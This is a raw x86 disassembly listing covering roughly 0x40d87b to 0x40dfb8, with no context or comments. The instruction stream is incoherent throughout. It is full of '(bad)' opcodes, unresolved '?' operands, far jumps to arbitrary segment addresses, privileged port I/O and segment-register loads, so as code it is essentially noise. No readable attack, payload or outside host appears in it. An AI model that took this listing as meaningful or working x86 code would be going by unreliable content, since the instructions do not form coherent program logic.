  40d87b:	xor    dl,dl
  40d87d:	push   esi
  40d87e:	bnd jno 0x40d81a
  40d881:	dec    ebx
  40d882:	xor    al,0x7f
  40d884:	jp     0x40d8a4
  40d886:	dec    ecx
  40d887:	jnp    0x40d8f4
  40d889:	jmp    0x491523c2
  40d88e:	(bad)  
  40d88f:	xor    bh,ah
  40d891:	adc    DWORD PTR [ecx+0x11],edi
  40d894:	dec    edi
  40d895:	pusha  
  40d896:	pop    ss
  40d897:	inc    ecx
  40d898:	fldz   
  40d89a:	or     DWORD PTR [esi-0x1f31240b],ecx
  40d8a0:	dec    eax
  40d8a1:	jmp    0x40d85b
  40d8a3:	test   al,0xaf
  40d8a5:	add    al,0xb6
  40d8a7:	retf   
  40d8a8:	lods   eax,DWORD PTR ds:[esi]
  40d8a9:	xor    BYTE PTR ds:0x6d8d29d4,al
  40d8af:	xchg   edi,eax
  40d8b0:	xrstor gs:[ebp+0x56]
  40d8b5:	jle    0x40d83d
  40d8b7:	xor    dl,BYTE PTR [ebp-0x49]
  40d8ba:	test   ecx,edx
  40d8bc:	pop    esi
  40d8bd:	jae    0x40d8cb
  40d8bf:	mov    ds:0x8ec79173,al
  40d8c4:	lds    ebx,FWORD PTR [ebx+0x4fb3bcc8]
  40d8ca:	mov    esi,0xfb9ab5d2
  40d8d0:	stc    
  40d8d1:	push   ecx
  40d8d2:	or     DWORD PTR es:[ebx+0x7d9fe607],eax
  40d8d9:	sahf   
  40d8da:	int3   
  40d8db:	mov    eax,0xb3ab3699
  40d8e0:	rol    DWORD PTR [ebx+0x3c5260b5],cl
  40d8e6:	retf   
  40d8e7:	mov    cl,0x32
  40d8e9:	es pop edi
  40d8eb:	mov    ss,eax
  40d8ed:	and    al,0x72
  40d8ef:	sbb    eax,0xd4a539da
  40d8f4:	and    DWORD PTR [ebx-0x2c],edx
  40d8f7:	push   eax
  40d8f8:	lods   eax,DWORD PTR ds:[esi]
  40d8f9:	out    dx,eax
  40d8fa:	dec    esp
  40d8fb:	or     al,0x41
  40d8fd:	pop    eax
  40d8fe:	ret    0x9e2e
  40d901:	lods   al,BYTE PTR ds:[esi]
  40d902:	test   DWORD PTR [esi+0x362757f3],0x43d8ab64
  40d90c:	ror    BYTE PTR [eax],cl
  40d90e:	(bad)  
  40d90f:	jns    0x40d897
  40d911:	mov    eax,0x11a44c84
  40d916:	sbb    al,0x91
  40d918:	pop    ecx
  40d919:	mov    bh,0xb6
  40d91b:	(bad)  
  40d91d:	pop    DWORD PTR [ebp+0x7e108c5e]
  40d923:	leave  
  40d924:	test   BYTE PTR [edi-0xd],ah
  40d927:	mov    fs,WORD PTR [ecx+0x23b6ccc7]
  40d92d:	lahf   
  40d92e:	ins    DWORD PTR es:[edi],dx
  40d92f:	or     eax,0x936921d5
  40d934:	jns    0x40d8c7
  40d936:	fidiv  DWORD PTR [ecx]
  40d938:	lods   al,BYTE PTR ds:[esi]
  40d939:	imul   ecx,DWORD PTR [esi],0x511e51f8
  40d93f:	add    al,0x98
  40d941:	fstp   TBYTE PTR [ecx]
  40d943:	mov    gs,ebx
  40d945:	xchg   edx,eax
  40d946:	test   DWORD PTR [ebx],edx
  40d948:	jle    0x40d92f
  40d94a:	inc    edi
  40d94b:	mov    bl,0xb7
  40d94d:	push   cs
  40d94e:	std    
  40d94f:	mov    cs,WORD PTR [ecx-0x23593be4]
  40d955:	adc    al,0x7b
  40d957:	dec    edx
  40d958:	lods   eax,DWORD PTR ds:[esi]
  40d959:	js     0x40d912
  40d95b:	shr    BYTE PTR [edx],cl
  40d95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d95e:	xor    ch,bh
  40d960:	test   DWORD PTR [edi+0x3da9561c],ebp
  40d966:	mov    ch,ah
  40d968:	call   0x52817fba
  40d96d:	rcr    ch,0x77
  40d970:	shl    bl,cl
  40d972:	sbb    edi,DWORD PTR [ecx+0x99a1b13]
  40d978:	jo     0x40d998
  40d97a:	adc    bl,BYTE PTR [ecx]
  40d97c:	das    
  40d97d:	jle    0x40d99a
  40d97f:	inc    edx
  40d980:	mov    edx,0xe627853c
  40d985:	je     0x40d9b5
  40d987:	cld    
  40d988:	(bad)  [ebx-0x3c807162]
  40d98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d98f:	mov    ebx,0x2f6cf450
  40d994:	shl    BYTE PTR [eax],cl
  40d996:	jmp    0xb70e:0x656a3877
  40d99d:	addr16 dec eax
  40d99f:	mov    ?,edx
  40d9a1:	mov    ds:0x35181a88,al
  40d9a6:	fadd   QWORD PTR [ecx-0x30]
  40d9a9:	cld    
  40d9aa:	retf   0xedec
  40d9ad:	xchg   ecx,eax
  40d9ae:	adc    bl,BYTE PTR [ebx]
  40d9b0:	pop    eax
  40d9b1:	lds    esp,FWORD PTR [edi]
  40d9b3:	(bad)
  40d9b7:	mov    ?,WORD PTR [eax+0x5eb4bb86]
  40d9bd:	or     BYTE PTR [ebp+ecx*1-0x2323a423],al
  40d9c4:	add    eax,0x92ee2f50
  40d9c9:	ss ins BYTE PTR es:[edi],dx
  40d9cb:	mov    gs,WORD PTR [ecx]
  40d9cd:	(bad)  
  40d9cf:	mov    dl,0xe1
  40d9d1:	xchg   ecx,eax
  40d9d2:	cs mov ds,ecx
  40d9d5:	call   0xa2137f00
  40d9da:	(bad)  
  40d9db:	pop    edi
  40d9dc:	pop    ds
  40d9dd:	mov    ah,0x2d
  40d9df:	jmp    ebp
  40d9e1:	jecxz  0x40da31
  40d9e3:	mov    ?,edi
  40d9e5:	repz mov ah,0xc
  40d9e8:	pop    esi
  40d9e9:	cmp    dh,bh
  40d9eb:	pushf  
  40d9ec:	ror    DWORD PTR [edx+0x59],cl
  40d9ef:	jl     0x40da5c
  40d9f1:	sub    dl,BYTE PTR [edi-0x11]
  40d9f4:	cmp    bh,0x93
  40d9f7:	mov    ds,WORD PTR [ebx]
  40d9f9:	push   0xeeb2105c
  40d9fe:	pop    edi
  40d9ff:	cdq    
  40da00:	fcom   DWORD PTR [ebx+edi*1-0x6bb02ca9]
  40da07:	mov    dh,0x7e
  40da09:	loopne 0x40d9c9
  40da0b:	aaa    
  40da0c:	and    dh,BYTE PTR [eax]
  40da0e:	mov    ebp,0x4b17708e
  40da13:	or     DWORD PTR [ecx-0x2dd6437f],ebp
  40da19:	cmp    eax,0x76447e00
  40da1e:	pop    ss
  40da1f:	inc    edx
  40da20:	push   esi
  40da21:	add    ch,BYTE PTR [eax-0x3def483e]
  40da27:	idiv   DWORD PTR [edx-0x33]
  40da2a:	lods   eax,DWORD PTR ds:[esi]
  40da2b:	enter  0x306f,0x85
  40da2f:	(bad)  
  40da30:	jmp    0xa869:0x7398e751
  40da37:	mov    gs,ecx
  40da39:	mov    DWORD PTR [edi+0x1d],edi
  40da3c:	fsincos 
  40da3e:	pop    esp
  40da3f:	cmp    al,cl
  40da41:	test   DWORD PTR [edi+ebp*1+0x12],0x3356aa35
  40da49:	push   esp
  40da4a:	je     0x40d9e3
  40da4c:	cdq    
  40da4d:	add    eax,0xe7e93682
  40da52:	and    al,0xe4
  40da54:	daa    
  40da55:	mov    cl,0x77
  40da57:	or     BYTE PTR [ecx],cl
  40da59:	push   ds
  40da5a:	test   DWORD PTR [ecx],ebx
  40da5c:	inc    bl
  40da5e:	popf   
  40da5f:	xchg   BYTE PTR [esi+0x21],bh
  40da62:	je     0x40d9f2
  40da64:	push   esi
  40da65:	stc    
  40da66:	adc    bl,BYTE PTR [ebp+edx*4+0x7]
  40da6a:	nop
  40da6b:	add    esi,ecx
  40da6d:	stos   BYTE PTR es:[edi],al
  40da6e:	call   0xcdbdad1e
  40da73:	jmp    0x40daed
  40da75:	sub    ch,BYTE PTR [edi-0x72]
  40da78:	scas   al,BYTE PTR es:[edi]
  40da79:	int    0x61
  40da7b:	pop    esp
  40da7c:	stos   DWORD PTR es:[edi],eax
  40da7d:	nop
  40da7e:	push   edi
  40da7f:	test   ecx,edx
  40da81:	mov    ebp,0xf1d3712e
  40da86:	fidivr DWORD PTR [ebx]
  40da88:	add    dh,dl
  40da8a:	int3   
  40da8b:	lahf   
  40da8c:	adc    bh,BYTE PTR [edi]
  40da8e:	sub    bh,bl
  40da90:	mov    dl,0xa5
  40da92:	add    al,0x4a
  40da94:	(bad)  
  40da95:	mov    eax,0xc0a5e85
  40da9a:	jle    0x40db0d
  40da9c:	scas   al,BYTE PTR es:[edi]
  40da9d:	into   
  40da9e:	mov    eax,0x853e975a
  40daa3:	push   edx
  40daa4:	test   eax,0xea68f2db
  40daa9:	out    0xef,al
  40daab:	xor    BYTE PTR [edi],0xfe
  40daae:	add    eax,0xd3a10306
  40dab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab4:	mov    ch,0x11
  40dab6:	pop    edi
  40dab7:	ffree  st(5)
  40dab9:	push   ecx
  40daba:	mov    eax,ecx
  40dabc:	or     edi,ebp
  40dabe:	test   ebx,ecx
  40dac0:	in     eax,dx
  40dac1:	mov    ecx,0x9681d0fa
  40dac6:	jne    0x40da55
  40dac8:	ins    DWORD PTR es:[edi],dx
  40dac9:	jg     0x40da6e
  40dacb:	adc    al,0x1e
  40dacd:	fdivr  st,st(5)
  40dacf:	mov    esi,0x21850406
  40dad4:	addr16 jl 0x40da91
  40dad7:	sbb    BYTE PTR [edx],0xe5
  40dada:	pop    edi
  40dadb:	mov    gs,WORD PTR [edx+0x11]
  40dade:	inc    DWORD PTR [edx-0x48]
  40dae1:	push   ebx
  40dae2:	mov    bl,0x6e
  40dae4:	lods   eax,DWORD PTR ds:[esi]
  40dae5:	inc    edx
  40dae6:	push   0xfdf9c671
  40daeb:	(bad)  
  40daec:	fwait
  40daed:	lock cmp al,0x96
  40daf0:	mov    ebx,0xbac66136
  40daf5:	jno    0x40db6c
  40daf7:	pop    esp
  40daf8:	(bad)  
  40dafa:	(bad)  
  40dafb:	cmp    BYTE PTR [edi],bh
  40dafd:	retf   0x4d2e
  40db00:	xor    cl,dh
  40db02:	lock add esp,DWORD PTR [ebp+0x60]
  40db06:	push   0xffffff8e
  40db08:	xchg   edi,eax
  40db09:	fld    TBYTE PTR [esp+ecx*2-0x44]
  40db0d:	outs   dx,BYTE PTR ds:[esi]
  40db0e:	sub    eax,0xcfa5aced
  40db13:	inc    esi
  40db14:	int3   
  40db15:	xchg   ecx,eax
  40db16:	retf   0x46ce
  40db19:	outs   dx,BYTE PTR ds:[esi]
  40db1a:	or     BYTE PTR [esi-0x7a950d26],0xac
  40db21:	pop    ecx
  40db22:	ins    DWORD PTR es:[edi],dx
  40db23:	adc    edx,edx
  40db25:	scas   al,BYTE PTR es:[edi]
  40db26:	xchg   esi,eax
  40db27:	adc    eax,0xb89d9200
  40db2c:	xlat   BYTE PTR ds:[ebx]
  40db2d:	jge    0x40db6e
  40db2f:	(bad)  
  40db30:	lds    edx,FWORD PTR [esi-0x17]
  40db33:	xlat   BYTE PTR ds:[ebx]
  40db34:	scas   eax,DWORD PTR es:[edi]
  40db35:	cld    
  40db36:	cmp    BYTE PTR [eax],ah
  40db38:	sar    BYTE PTR [eax+0x7d39734d],cl
  40db3e:	daa    
  40db3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db40:	xor    BYTE PTR [esi],bl
  40db42:	or     eax,0xee7674ec
  40db47:	add    ah,BYTE PTR [esi+ebx*8-0x43]
  40db4b:	xlat   BYTE PTR ds:[ebx]
  40db4c:	aam    0xef
  40db4e:	mov    ah,bl
  40db50:	mov    ecx,0x407b40a3
  40db55:	mov    al,0xb1
  40db57:	in     eax,0xf8
  40db59:	loop   0x40db8d
  40db5b:	(bad)  
  40db5c:	xchg   ecx,eax
  40db5d:	xor    dh,ch
  40db5f:	sar    DWORD PTR [esi-0xd],cl
  40db62:	dec    ebp
  40db63:	push   esi
  40db64:	stos   BYTE PTR es:[edi],al
  40db65:	xor    eax,0x66a9bdd8
  40db6a:	adc    ecx,DWORD PTR [edi]
  40db6c:	ja     0x40db81
  40db6e:	gs test eax,ebp
  40db71:	scas   al,BYTE PTR es:[edi]
  40db72:	out    0x69,al
  40db74:	adc    al,BYTE PTR [ecx*8-0x5e78452d]
  40db7b:	push   cs
  40db7c:	sub    BYTE PTR [edi+0x7e2521b0],al
  40db82:	push   0xffffffd0
  40db84:	rcl    bl,cl
  40db86:	bound  edi,QWORD PTR [ebp-0x5f]
  40db89:	je     0x40db6b
  40db8b:	(bad)  
  40db8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db8d:	adc    DWORD PTR [eax],edx
  40db8f:	or     eax,0xffffffc1
  40db92:	add    ecx,DWORD PTR [ecx-0x17]
  40db95:	push   ds
  40db96:	test   DWORD PTR [ebx-0x1d6b624d],esi
  40db9c:	ins    BYTE PTR es:[edi],dx
  40db9d:	mov    ebx,DWORD PTR [edi-0x1ec1426f]
  40dba3:	mov    dh,0x5c
  40dba5:	pop    esi
  40dba6:	je     0x40dbb9
  40dba8:	or     al,0x91
  40dbaa:	test   DWORD PTR [ebp-0x31dd780a],esp
  40dbb0:	out    dx,al
  40dbb1:	sub    al,0x69
  40dbb3:	xchg   ecx,eax
  40dbb4:	sahf   
  40dbb5:	imul   ebx,DWORD PTR [ecx-0x69],0xffffffd7
  40dbb9:	jnp    0x40db3f
  40dbbb:	sub    al,0xc0
  40dbbd:	sahf   
  40dbbe:	mov    eax,ds:0x4811357e
  40dbc3:	jecxz  0x40dbd6
  40dbc5:	pop    ss
  40dbc6:	ret    
  40dbc7:	push   cs
  40dbc8:	fdiv   DWORD PTR [esi-0xf6ae57b]
  40dbce:	inc    esp
  40dbcf:	push   ds
  40dbd0:	fild   DWORD PTR [ecx+0x7f]
  40dbd3:	hlt    
  40dbd4:	not    DWORD PTR [ecx]
  40dbd6:	add    ebp,DWORD PTR [esi+0x9608b1f]
  40dbdc:	iret   
  40dbdd:	mov    dl,0x84
  40dbdf:	sar    DWORD PTR [eax+0xf],1
  40dbe2:	fdiv   DWORD PTR [ecx]
  40dbe4:	adc    bh,BYTE PTR [ebx-0x4f]
  40dbe7:	psllw  mm2,QWORD PTR [ecx]
  40dbea:	and    DWORD PTR ds:0x10f8522f,ebp
  40dbf0:	test   eax,0xe29f85b2
  40dbf5:	jmp    0x37d32027
  40dbfa:	sub    eax,DWORD PTR [eax-0x710d208a]
  40dc00:	jp     0x40db82
  40dc02:	sub    BYTE PTR ds:0xd5ffdb84,0x80
  40dc09:	adc    bl,bl
  40dc0b:	push   cs
  40dc0c:	inc    edx
  40dc0d:	inc    ecx
  40dc0e:	nop
  40dc0f:	arpl   cx,si
  40dc11:	adc    DWORD PTR [edi-0x46],ebx
  40dc14:	pusha  
  40dc15:	aaa    
  40dc16:	push   esi
  40dc17:	pop    es
  40dc18:	mov    dh,0x16
  40dc1a:	test   DWORD PTR [esi],edx
  40dc1c:	or     edx,DWORD PTR [edx]
  40dc1e:	fwait
  40dc1f:	mov    ss:0x4480dfaf,al
  40dc25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc26:	adc    DWORD PTR [edi+0x5e6b6956],edx
  40dc2c:	xor    eax,0xd277fe95
  40dc31:	or     edi,edx
  40dc33:	xchg   ebp,eax
  40dc34:	xchg   BYTE PTR [esi+0x1e7f5cb1],dh
  40dc3a:	dec    ebp
  40dc3b:	mov    esp,0xa4c7634c
  40dc40:	lods   eax,DWORD PTR ds:[esi]
  40dc41:	jmp    0x5c33:0xe5ea4d85
  40dc48:	outs   dx,DWORD PTR ds:[esi]
  40dc49:	test   BYTE PTR [ebx-0x72],al
  40dc4c:	mov    dl,0x8a
  40dc4e:	pop    edi
  40dc4f:	dec    edx
  40dc50:	mov    esi,0xd2fc7c56
  40dc55:	sub    BYTE PTR [esi-0x3a],ah
  40dc58:	int    0x49
  40dc5a:	(bad)  
  40dc5b:	iret   
  40dc5c:	not    DWORD PTR [ecx]
  40dc5e:	xchg   edx,eax
  40dc5f:	mov    BYTE PTR [eax+0x49bb7d40],al
  40dc65:	in     eax,0xf4
  40dc67:	cmp    ch,BYTE PTR [edi+ecx*4]
  40dc6a:	xchg   BYTE PTR [edi-0x1c],cl
  40dc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc6e:	or     BYTE PTR [ebx+0x30048e47],ch
  40dc74:	sbb    eax,0x33582e11
  40dc79:	xor    DWORD PTR [ecx],edi
  40dc7b:	scas   eax,DWORD PTR es:[edi]
  40dc7c:	dec    ecx
  40dc7d:	fiadd  DWORD PTR [ebp-0x23b48aad]
  40dc83:	pop    ebx
  40dc84:	pop    esi
  40dc85:	(bad)  
  40dc87:	xchg   edx,eax
  40dc88:	(bad)  
  40dc89:	int3   
  40dc8a:	ret    0x397c
  40dc8d:	push   ecx
  40dc8e:	(bad)  
  40dc8f:	daa    
  40dc90:	jbe    0x40dcc4
  40dc92:	test   DWORD PTR [ebx+ebp*4+0xaf1a4d8],ebp
  40dc99:	out    0x4f,eax
  40dc9b:	mov    dl,BYTE PTR [esi+0x0]
  40dc9e:	mov    DWORD PTR [esi],ecx
  40dca0:	es ds jmp 0xb482:0x8c65e450
  40dca9:	mov    eax,0x42490ee8
  40dcae:	pop    ebx
  40dcaf:	and    dh,BYTE PTR [ebp-0x7c]
  40dcb2:	scas   al,BYTE PTR es:[edi]
  40dcb3:	mov    cs,WORD PTR [eax-0x2ffae01e]
  40dcb9:	push   edi
  40dcba:	jecxz  0x40dc63
  40dcbc:	rol    DWORD PTR [esi],1
  40dcbe:	add    DWORD PTR [edx],ebx
  40dcc0:	lea    edx,[ecx-0x1c4a959c]
  40dcc6:	hlt    
  40dcc7:	mov    es,WORD PTR [edi+0x77d9dcd3]
  40dccd:	leave  
  40dcce:	lahf   
  40dccf:	add    edx,edx
  40dcd1:	dec    ecx
  40dcd2:	ja     0x40dcfb
  40dcd4:	stos   BYTE PTR es:[edi],al
  40dcd5:	add    ah,BYTE PTR [ebp+0x33]
  40dcd8:	jmp    0x40dceb
  40dcda:	inc    esp
  40dcdb:	les    edx,FWORD PTR [esi+0x5f928fc5]
  40dce1:	sahf   
  40dce2:	test   esi,eax
  40dce4:	pshufw mm2,mm4,0x86
  40dce8:	jno    0x40dcbe
  40dcea:	or     DWORD PTR [esi+0x2e35b9f9],ecx
  40dcf0:	mov    esp,0xd2d761ba
  40dcf5:	jecxz  0x40dd4b
  40dcf7:	dec    ebp
  40dcf8:	fmul   QWORD PTR [esp+edi*1+0x61]
  40dcfc:	push   ebp
  40dcfd:	push   ds
  40dcfe:	dec    ecx
  40dcff:	pop    edx
  40dd00:	ja     0x40dce4
  40dd02:	fwait
  40dd03:	pusha  
  40dd04:	sub    al,0xdb
  40dd06:	mov    ecx,DWORD PTR [ecx-0x5cba6bc9]
  40dd0c:	jle    0x40dd5f
  40dd0e:	imul   esi
  40dd10:	and    al,ah
  40dd12:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40dd14:	loop   0x40dd2b
  40dd16:	imul   DWORD PTR [edx-0x31]
  40dd19:	adc    al,0x3d
  40dd1b:	sahf   
  40dd1c:	jb     0x40dd79
  40dd1e:	mov    ebp,0x8474fa8f
  40dd23:	fsubr  QWORD PTR [eax]
  40dd25:	mov    edx,ebp
  40dd27:	fisttp QWORD PTR [edi]
  40dd29:	mov    ch,0xc4
  40dd2b:	mov    ss,WORD PTR [edi]
  40dd2d:	jbe    0x40dd76
  40dd2f:	push   ecx
  40dd30:	push   ds
  40dd31:	loope  0x40dcce
  40dd33:	(bad)  
  40dd34:	rcl    cl,cl
  40dd36:	pop    esi
  40dd37:	xchg   BYTE PTR [ecx+0x2d],cl
  40dd3a:	psubsw mm1,QWORD PTR [esi]
  40dd3d:	stc    
  40dd3e:	test   eax,0xaf11def8
  40dd43:	inc    esp
  40dd44:	clc    
  40dd45:	dec    ebp
  40dd46:	push   eax
  40dd47:	mov    esp,0x3847122
  40dd4c:	add    cl,BYTE PTR [esi+0x64b0cb1c]
  40dd52:	lods   eax,DWORD PTR ds:[esi]
  40dd53:	mov    dh,BYTE PTR [edi-0x4]
  40dd56:	call   0xf93dda29
  40dd5b:	sbb    esi,ecx
  40dd5d:	mov    cl,BYTE PTR cs:[edx]
  40dd60:	xlat   BYTE PTR ds:[ebx]
  40dd61:	jb     0x40dd70
  40dd63:	xchg   ecx,eax
  40dd64:	loopne 0x40dcfc
  40dd66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd67:	dec    ebx
  40dd68:	add    edx,DWORD PTR [ecx]
  40dd6a:	and    BYTE PTR [eax-0x6de2306d],bl
  40dd70:	cwde   
  40dd71:	out    dx,eax
  40dd72:	test   DWORD PTR [ebx-0x5e],eax
  40dd75:	cmp    ebp,esp
  40dd77:	in     eax,dx
  40dd78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd79:	scas   eax,DWORD PTR es:[edi]
  40dd7a:	sbb    BYTE PTR [esi-0x518aa98a],cl
  40dd80:	inc    esp
  40dd81:	out    dx,al
  40dd82:	ins    BYTE PTR es:[edi],dx
  40dd83:	aaa    
  40dd84:	shl    BYTE PTR [ebx+0x24],cl
  40dd87:	lods   ax,WORD PTR ds:[esi]
  40dd89:	jge    0x40dd13
  40dd8b:	(bad)  
  40dd8d:	adc    DWORD PTR [edx+0x16],esi
  40dd90:	stos   DWORD PTR es:[edi],eax
  40dd91:	push   ebp
  40dd92:	or     esi,DWORD PTR [edi-0x32]
  40dd95:	dec    edx
  40dd96:	test   BYTE PTR [edx+0x2f],al
  40dd99:	loopne 0x40dd88
  40dd9b:	mov    ebp,0x629ef123
  40dda0:	or     dl,BYTE PTR [ecx]
  40dda2:	lahf   
  40dda3:	fld    QWORD PTR [edx]
  40dda5:	pop    ss
  40dda6:	add    DWORD PTR [edi+0x2685af3f],edx
  40ddac:	dec    edx
  40ddad:	pop    es
  40ddae:	outs   dx,DWORD PTR ds:[esi]
  40ddaf:	sti    
  40ddb0:	pop    esi
  40ddb1:	mov    ebx,0x1114e2c4
  40ddb6:	out    0xc6,eax
  40ddb8:	aad    0x7d
  40ddba:	inc    ebp
  40ddbb:	cld    
  40ddbc:	(bad)  
  40ddbd:	in     eax,0x85
  40ddbf:	xchg   DWORD PTR [ecx-0x57],ebp
  40ddc2:	jae    0x40dd9f
  40ddc4:	adc    al,BYTE PTR [eax]
  40ddc6:	sahf   
  40ddc7:	mov    es,WORD PTR [edi-0x2e]
  40ddca:	push   es
  40ddcb:	sub    esp,ecx
  40ddcd:	xor    eax,0xddd29e0b
  40ddd2:	cwde   
  40ddd3:	leave  
  40ddd4:	push   0x78c714c5
  40ddd9:	push   ds
  40ddda:	xchg   BYTE PTR [edi+0x5548373a],cl
  40dde0:	push   esp
  40dde1:	fild   DWORD PTR [esp+eiz*4+0x5d813d26]
  40dde8:	ret    0xf780
  40ddeb:	lock jb 0x40de0c
  40ddee:	mov    WORD PTR [esi],es
  40ddf0:	iret   
  40ddf1:	xchg   BYTE PTR [ebx-0xd],ah
  40ddf4:	mov    al,0x67
  40ddf6:	test   BYTE PTR [ebp-0x76],dh
  40ddf9:	call   0x79b0b6d7
  40ddfe:	pop    ebp
  40ddff:	outs   dx,DWORD PTR ds:[esi]
  40de00:	sbb    al,0x26
  40de02:	and    cl,ch
  40de04:	push   edx
  40de05:	scas   eax,DWORD PTR es:[edi]
  40de06:	mov    ?,WORD PTR [edx+0x46cdeb7f]
  40de0c:	ror    BYTE PTR [ecx+edi*8+0x78],cl
  40de10:	int3   
  40de11:	(bad)  
  40de12:	test   BYTE PTR [edi],0xc7
  40de15:	adc    DWORD PTR [ecx-0x66],edi
  40de18:	xchg   ecx,eax
  40de19:	sub    bl,BYTE PTR [eax]
  40de1b:	(bad)  [ecx]
  40de1d:	icebp  
  40de1e:	test   DWORD PTR [esi+ebx*4+0x14],ebp
  40de22:	sbb    al,0xdb
  40de24:	mov    gs:0xdc17970c,al
  40de2a:	sub    BYTE PTR [ebx-0x43],cl
  40de2d:	xor    DWORD PTR [eax+esi*8+0x24],ebx
  40de31:	sub    BYTE PTR [ebp-0x39],ch
  40de34:	lods   al,BYTE PTR ds:[esi]
  40de35:	gs jmp 0xfd4c5b7d
  40de3b:	out    dx,al
  40de3c:	dec    esp
  40de3d:	repz and dh,ch
  40de40:	or     DWORD PTR [ecx],edx
  40de42:	fdivr  DWORD PTR [ebp+edx*1-0x51]
  40de46:	pop    esp
  40de47:	into   
  40de48:	mov    eax,ds:0x1f78859d
  40de4d:	jl     0x40de00
  40de4f:	fdivr  QWORD PTR [ecx-0x22]
  40de52:	test   dh,ah
  40de54:	add    dl,BYTE PTR [ecx]
  40de56:	and    eax,0xd5d14b2c
  40de5b:	sbb    al,0xb6
  40de5d:	add    bl,BYTE PTR [edi-0x7a027ee9]
  40de63:	fs (bad) 
  40de65:	(bad)  
  40de66:	jno    0x40de63
  40de68:	add    DWORD PTR [ecx],edx
  40de6a:	out    0x54,eax
  40de6c:	gs pop eax
  40de6e:	push   ebx
  40de6f:	xchg   ecx,eax
  40de70:	xor    eax,0xeaad8459
  40de75:	push   eax
  40de76:	cli    
  40de77:	sbb    al,0x22
  40de79:	adc    al,0x24
  40de7b:	imul   esi,DWORD PTR [ebp-0x1bf70aef],0xec24b1c8
  40de85:	add    BYTE PTR [edx+ecx*2-0x6a5eaf65],0xb2
  40de8d:	aas    
  40de8e:	dec    edx
  40de8f:	add    al,0xf0
  40de91:	sbb    ecx,DWORD PTR gs:[esi-0x304f0fea]
  40de98:	mov    eax,0xb865a5f7
  40de9d:	inc    esi
  40de9e:	test   BYTE PTR [ebx+0x19f9009c],bh
  40dea4:	scas   eax,DWORD PTR es:[edi]
  40dea5:	cmp    eax,0xe0936a30
  40deaa:	ret    
  40deab:	mov    gs,WORD PTR [ebx+0x20bdebf9]
  40deb1:	jmp    0xf1628059
  40deb6:	xchg   BYTE PTR ds:0x6bb41caa,ah
  40debc:	xchg   edx,eax
  40debd:	xchg   ebx,eax
  40debe:	push   ds
  40debf:	add    DWORD PTR [eax-0x4c8ee7ef],eax
  40dec5:	mov    ebx,DWORD PTR [eax+0x2a]
  40dec8:	fmul   st,st(3)
  40deca:	mov    bh,bh
  40decc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40decd:	cdq    
  40dece:	cmp    al,0x80
  40ded0:	add    DWORD PTR [ecx+0x1e7b49a9],esp
  40ded6:	das    
  40ded7:	jle    0x40df2e
  40ded9:	pusha  
  40deda:	fisubr DWORD PTR [ecx-0x1074db57]
  40dee0:	sbb    al,0x8e
  40dee2:	mov    al,BYTE PTR [ebx-0x54]
  40dee5:	rcr    dh,1
  40dee7:	out    0x3e,al
  40dee9:	cdq    
  40deea:	push   esp
  40deeb:	mov    ?,WORD PTR [ebx+esi*8+0x7289897d]
  40def2:	adc    BYTE PTR [eax],0xbe
  40def5:	jp     0x40de7b
  40def7:	into   
  40def8:	mov    ebp,0xb3154c46
  40defd:	(bad)  
  40deff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df00:	das    
  40df01:	sub    al,BYTE PTR [ebp+0x108c894b]
  40df07:	call   0x85f1:0xf0ee8c5a
  40df0e:	das    
  40df0f:	pop    ecx
  40df10:	xchg   edx,eax
  40df11:	icebp  
  40df12:	or     BYTE PTR [ebp-0x5095df81],ch
  40df18:	inc    edx
  40df19:	jb     0x40deec
  40df1b:	mov    gs,WORD PTR [esi+0x4]
  40df1e:	push   ecx
  40df1f:	xchg   esi,eax
  40df20:	pusha  
  40df21:	add    ecx,0xc01dd258
  40df27:	jge    0x40df08
  40df29:	repz mov ecx,DWORD PTR [ebp+0x43]
  40df2d:	cmp    DWORD PTR [edx],esp
  40df2f:	cmp    dl,BYTE PTR [edx-0x3]
  40df32:	jno    0x40df9f
  40df34:	ret    0x8cee
  40df37:	out    0xa4,al
  40df39:	outs   dx,DWORD PTR ds:[esi]
  40df3a:	aam    0x50
  40df3c:	rcl    bl,cl
  40df3e:	ins    DWORD PTR es:[edi],dx
  40df3f:	rcr    BYTE PTR [ebp+esi*2+0x113349ef],1
  40df46:	push   ebx
  40df47:	inc    ecx
  40df48:	(bad)
  40df4b:	(bad)  
  40df4d:	push   edi
  40df4e:	test   BYTE PTR [ebx+ebx*8],ch
  40df51:	xchg   BYTE PTR [edi+0x2e],al
  40df54:	pop    ax
  40df56:	push   ss
  40df57:	mov    es,esp
  40df59:	out    0x7f,eax
  40df5b:	adc    BYTE PTR ds:0xd2abc093,ch
  40df61:	and    eax,0x400bfd68
  40df66:	cmp    BYTE PTR [edi+0x2f451114],al
  40df6c:	sbb    ecx,edi
  40df6e:	mov    edx,0x858cafe7
  40df73:	add    dh,BYTE PTR [ecx+edx*1+0x47]
  40df77:	dec    ebp
  40df78:	jnp    0x40dfee
  40df7a:	and    ecx,DWORD PTR [esi-0x48c49b09]
  40df80:	jmp    0xd583:0xd2399f2d
  40df87:	sbb    eax,0x4b5ef9e
  40df8c:	ins    BYTE PTR es:[edi],dx
  40df8d:	push   ds
  40df8e:	adc    BYTE PTR [esi-0x15],ch
  40df91:	iret   
  40df92:	jecxz  0x40df8c
  40df94:	xor    esp,DWORD PTR [ecx]
  40df96:	test   DWORD PTR [edx-0x7cd078c2],ebp
  40df9c:	pop    edx
  40df9d:	bound  eax,QWORD PTR [esi]
  40df9f:	mov    ?,WORD PTR [edi+0x5e]
  40dfa2:	sbb    DWORD PTR [ebp-0x486620bc],ebx
  40dfa8:	shl    BYTE PTR [esi-0x638a2d9],cl
  40dfae:	ds mov edx,0x8e1863d0
  40dfb4:	in     eax,dx
  40dfb5:	push   esp
  40dfb6:	outs   dx,DWORD PTR ds:[esi]
  40dfb7:	aas    
  40dfb8:	hlt    
